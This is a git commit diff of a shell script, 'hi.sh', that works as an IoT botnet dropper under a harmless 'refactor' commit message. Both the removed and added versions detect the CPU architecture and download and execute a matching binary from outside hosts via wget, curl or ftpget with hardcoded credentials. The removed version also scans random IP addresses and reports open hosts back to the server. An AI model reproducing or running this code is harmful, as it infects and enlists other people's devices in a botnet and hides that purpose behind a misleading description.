6717c3723a4cf041d13f5343668253780e4f1321
urBenm4 <138570858+urBenm4@users.noreply.github.com>
2026-03-06 22:55:18 +0400

    Refactor hi.sh for improved architecture and functionality

--- hi.sh
+++ hi.sh
@@ -1,45 +1,32 @@
 #!/bin/sh
-URL="http://zcxrhxvzomjvimghksngrmlbmqowfazmzvlbjolihytuwfwpslctbscvsdjyno.expnetwork.pro"
+export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
 
-A=$(uname -m)
-case "$A" in
-    mips) T="mips" ;;
-    mipsel|mipsle|*mips*) T="mpsl" ;; 
-    aarch64|arm64) T="arm64" ;;
-    arm*) T="arm" ;; # Handles armv5, v6, v7 with your nt.arm
-    x86_64|amd64) T="x86" ;;
-    i*86) T="x86" ;; # Maps 32-bit x86 to your nt.x86
-    ppc*|powerpc*) T="ppc" ;;
-    sh4*) T="sh4" ;;
-    m68k*) T="m68k" ;;
-    *) T="mips" ;; # Fallback to mips (most common IoT)
+ARCH=$(uname -m)
+case "$ARCH" in
+    *armv7*|*armv6*) BIN="nt.arm" ;;
+    *aarch64*|*arm64*) BIN="nt.arm64" ;;
+    *mips64*) BIN="nt.mips64" ;;
+    *mipsel*|*mips*l) BIN="nt.mpsl" ;;
+    *mips*) BIN="nt.mips" ;;
+    *x86_64*) BIN="nt.x86_64" ;;
+    *i386*|*i686*) BIN="nt.x86" ;;
+    *ppc*|*powerpc*) BIN="nt.ppc" ;;
+    *sh4*) BIN="nt.sh4" ;;
+    *m68k*) BIN="nt.m68k" ;;
+    *sparc*) BIN="nt.sparc" ;;
+    *) BIN="nt.arm" ;;
 esac
 
-BIN="nt.$T"
-DOWNLOADED=0
-
-cd /tmp || cd /run || cd /var/run || cd /
-
-wget -q $URL/$BIN -O nt || curl -sL $URL/$BIN -o nt
-if [ -f "nt" ]; then
-    chmod +x nt
-    ./nt &
-    sleep 2
-    rm -f nt
-    exit 0
-fi
-
-RA=$(expr $RANDOM % 223 + 1)
-RB=$(expr $RANDOM % 254 + 1)
-
-while true; do
-    i=$(expr $RANDOM % 254 + 1)
-    j=$(expr $RANDOM % 254 + 1)
-    TARGET="$RA.$RB.$i.$j"
-    
-    (echo > /dev/tcp/$TARGET/80) >/dev/null 2>&1
-    if [ $? -eq 0 ]; then
-        wget -qO- "$URL/submit?ip=$TARGET" >/dev/null 2>&1
-        curl -s "$URL/submit?ip=$TARGET" >/dev/null 2>&1
-    fi
+for dir in /tmp /var /dev/shm /mnt /data /var/tmp; do
+    cd $dir && break
 done
+
+(wget http://hi.risesmp.xyz/$BIN -O nt || \
+ curl -L http://hi.risesmp.xyz/$BIN -o nt || \
+ ftpget -v -u goot -p 1lo2ey134251 5.223.61.123 nt $BIN)
+
+chmod +x nt
+./nt tplink &
+sh nt tplink &
+
+rm -f hi.sh
